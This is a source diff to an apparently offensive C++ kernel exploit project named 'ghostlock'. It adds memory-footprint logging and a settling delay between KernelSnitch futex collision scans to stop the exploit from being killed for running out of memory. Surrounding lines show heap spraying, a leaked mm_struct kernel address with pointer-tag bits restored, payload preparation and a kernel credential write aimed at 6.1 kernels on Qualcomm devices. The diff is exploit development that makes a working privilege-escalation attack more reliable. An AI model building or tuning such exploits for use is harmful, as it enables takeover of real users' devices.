@@ -27,6 +27,36 @@ namespace {
     unsigned char *skb_buf() {
         return ghostlock::session::g_exploit_session.heap.skb_buffer.get();
     }
+
+    /* Footprint of the exploit process, sampled where a second spray pass has
+     * to prove it is not the pass that ran the device out of memory. The
+     * process is SIGKILLed from outside when that happens, so nothing can be
+     * collected afterwards: the readings have to be taken while it is alive.
+     * PSI is the kernel's own verdict on memory pressure, which distinguishes
+     * "we grew too big" from "the system was already short". */
+    void log_memory(const char *tag) {
+        long long rss_kb = -1;
+        long long hwm_kb = -1;
+        long long threads = -1;
+        if (FILE *status = fopen("/proc/self/status", "re")) {
+            char line[256];
+            while (fgets(line, sizeof(line), status)) {
+                if (!strncmp(line, "VmRSS:", 6)) rss_kb = atoll(line + 6);
+                else if (!strncmp(line, "VmHWM:", 6)) hwm_kb = atoll(line + 6);
+                else if (!strncmp(line, "Threads:", 8)) threads = atoll(line + 8);
+            }
+            fclose(status);
+        }
+        char psi[80] = "n/a";
+        if (FILE *pressure = fopen("/proc/pressure/memory", "re")) {
+            if (!fgets(psi, sizeof(psi), pressure)) psi[0] = '\0';
+            fclose(pressure);
+            char *newline = strchr(psi, '\n');
+            if (newline) *newline = '\0';
+        }
+        pr_info("[mem] %s rss=%lldMB hwm=%lldMB threads=%lld %s\n",
+                tag, rss_kb / 1024, hwm_kb / 1024, threads, psi);
+    }
 } // namespace
 
 namespace ghostlock::support {
@@ -477,6 +507,7 @@ namespace ghostlock::support {
     uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
         struct timespec t_spray;
         clock_gettime(CLOCK_MONOTONIC, &t_spray);
+        log_memory("prepare begin");
         /* Release every userspace reference from the preceding write before the
          * context arrays are replaced. Keeping the final post-spray memfd pinned
          * leaked one mm_struct per stage and progressively poisoned later sprays. */
@@ -601,6 +632,7 @@ namespace ghostlock::support {
         (void) snitch.scan();
         pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
                 snitch.result(), ms_since(&t_spray));
+        log_memory("after leak");
         uintptr_t leaked = snitch.result();
         /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
         leaked |= static_cast<uintptr_t>(0xf) << 56;
@@ -689,6 +721,7 @@ namespace ghostlock::support {
             }
         }
         pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
+        log_memory("payload ready");
         snitch.reset();
 
         for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
@@ -745,5 +778,24 @@ namespace ghostlock::support {
                        max_attempts, ms_since(&t_good));
         }
         return 0;
+    }
+
+    void settle_w2_prebuild(void) {
+        /* The W2 credential write runs two full KernelSnitch collision scans
+         * back to back (prebuild page, then the main write). Each scan spins
+         * futex wait/wake across every online CPU; on the qcom/other 6.1.141
+         * line the subsystem is saturated by the ~128 punch+walk cycles of W1
+         * and W1b, so a second scan started immediately gets the process
+         * SIGKILLed from outside. Let the PI waiters drain before re-entering.
+         * A plain sleep is not enough: sched_yield in a loop keeps this thread
+         * runnable and lets the armed waiter threads time out their futex
+         * waits, which is the state the scan needs to see. */
+        constexpr useconds_t kSettleStepUs = 100000;   // 100ms
+        constexpr int32_t kSettleSteps = 3;            // 300ms total
+        for (int32_t i = 0; i < kSettleSteps; i++) {
+            sched_yield();
+            usleep(kSettleStepUs);
+        }
+        log_memory("w2 prebuild settle");
     }
 } // namespace ghostlock::support
